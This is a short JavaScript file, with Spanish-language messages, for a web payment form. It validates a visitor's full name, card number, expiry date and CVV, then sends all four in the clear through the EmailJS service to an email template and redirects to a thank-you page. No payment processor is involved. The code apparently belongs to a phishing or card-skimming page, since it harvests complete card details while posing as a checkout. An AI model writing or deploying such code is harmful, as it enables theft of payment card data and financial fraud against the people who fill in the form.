emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const loader = document.getElementById('mensajeCarga');
    const errores = document.getElementById('errores');

    errores.innerHTML = '';
    
    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    const mensajesError = [];
    
    if (!/^[a-zA-ZÀ-ÿñÑ\s]{4,}$/.test(datos.nombre_completo)) {
        mensajesError.push('❌ El nombre debe tener al menos 4 letras');
    }

    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
        mensajesError.push('❌ Tarjeta inválida (16 dígitos requeridos)');
    }

    if (new Date(datos.fecha_expiracion) < new Date()) {
        mensajesError.push('❌ La tarjeta está expirada');
    }

    if (!/^\d{3,4}$/.test(datos.codigo_cvv)) { // Cambio clave aquí
        mensajesError.push('❌ CVV inválido (3-4 dígitos)');
    }

    if (mensajesError.length > 0) {
        errores.innerHTML = mensajesError.map(msg => `<div class="error-msg">${msg}</div>`).join('');
        return;
    }

    loader.style.display = 'block';

    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            errores.innerHTML = `<div class="error-msg">❌ Error al enviar: ${error.text}</div>`;
        })
        .finally(() => {
            loader.style.display = 'none';
        });
});

// Formateador de tarjeta
document.getElementById('tarjeta').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});
